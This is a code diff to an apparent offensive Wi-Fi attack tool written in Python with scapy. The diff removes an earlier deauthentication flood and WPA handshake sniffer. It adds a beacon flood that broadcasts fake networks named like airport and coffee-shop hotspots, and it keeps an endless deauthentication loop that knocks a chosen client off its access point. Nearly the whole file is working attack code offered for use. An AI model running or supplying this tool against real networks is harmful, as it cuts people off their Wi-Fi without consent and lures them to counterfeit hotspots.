@@ -1,65 +1,47 @@
-# --- Module: Wireless Ops (Davoid Offensive Suite) ---
-# Purpose: Layer 2 Wireless Attacks (Deauth & Handshake Capture)
-
 import time
-import os
-from scapy.all import Dot11, RadioTap, Dot11Deauth, sendp, sniff, conf, wrpcap
+from scapy.all import Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt, sendp, sniff, wrpcap
 from rich.console import Console
 from core.ui import draw_header
-from core.context import ctx
 
 console = Console()
 
 
-def deauth_flood(target, bssid, iface):
-    """Sends continuous deauthentication frames to kick a client."""
-    # addr1=target, addr2=bssid, addr3=bssid
-    dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
-    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+def beacon_flood(iface):
+    """Floods the area with fake 'Free WiFi' networks."""
+    ssids = ["Free Airport WiFi", "Starbucks_Guest",
+             "Xfinity_Open", "Public_High_Speed"]
+    console.print("[bold red][!] Starting Beacon Flood...[/bold red]")
 
-    console.print(
-        f"[bold red][!] FLOODING {target} via {bssid}... (Ctrl+C to Stop)[/bold red]")
+    pkts = []
+    for s in ssids:
+        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
+                      addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
+        beacon = Dot11Beacon(cap="ESS+privacy")
+        essid = Dot11Elt(ID="SSID", info=s, len=len(s))
+        pkts.append(RadioTap()/dot11/beacon/essid)
+
     try:
         while True:
-            sendp(packet, iface=iface, count=64, inter=0.1, verbose=False)
+            for p in pkts:
+                sendp(p, iface=iface, verbose=False)
+            time.sleep(0.1)
     except KeyboardInterrupt:
-        console.print("\n[yellow][*] Attack Halted.[/yellow]")
+        pass
 
 
 def run_wifi_suite():
-    draw_header("Wireless Offensive Suite")
+    draw_header("Wireless Offensive Suite Pro")
+    iface = console.input(
+        "[bold yellow]Monitor Mode Interface: [/bold yellow]")
 
-    # Pull interface from global context
-    iface = ctx.get("INTERFACE")
-    console.print(
-        f"[cyan][*] Active Interface:[/cyan] [bold white]{iface}[/bold white]")
-
-    console.print("\n[1] Deauth Flood (Targeted/Broadcast)")
-    console.print("[2] WPA Handshake Sniffer")
-    console.print("[B] Return to Main")
-
-    choice = console.input("\n[wifi]> ").lower()
+    console.print("\n[1] Deauth Attack  [2] Handshake Sniff  [3] Beacon Flood")
+    choice = console.input("\n[wifi]> ")
 
     if choice == "1":
-        target = console.input(
-            "[bold yellow]Target Client MAC (FF:FF:FF:FF:FF:FF for all): [/bold yellow]") or "FF:FF:FF:FF:FF:FF"
-        bssid = console.input(
-            "[bold yellow]Access Point BSSID (MAC): [/bold yellow]")
-        if bssid:
-            deauth_flood(target, bssid, iface)
-
-    elif choice == "2":
-        console.print(
-            "[bold cyan][*] Sniffing for EAPOL (Handshake) packets...[/bold cyan]")
-        # Filters for 4-way handshake packets
-        packets = sniff(iface=iface, filter="type data", count=50, timeout=60)
-        if packets:
-            fname = f"handshake_{int(time.time())}.pcap"
-            wrpcap(fname, packets)
-            console.print(
-                f"[green][+] Potential handshake saved to {fname}[/green]")
-        else:
-            console.print(
-                "[red][!] No handshake captured. Try running a Deauth attack simultaneously.[/red]")
-
-    input("\nPress Enter to return...")
+        target = console.input("Target Client: ")
+        bssid = console.input("AP BSSID: ")
+        pkt = RadioTap()/Dot11(addr1=target, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
+        while True:
+            sendp(pkt, iface=iface, count=10, inter=0.1)
+    elif choice == "3":
+        beacon_flood(iface)
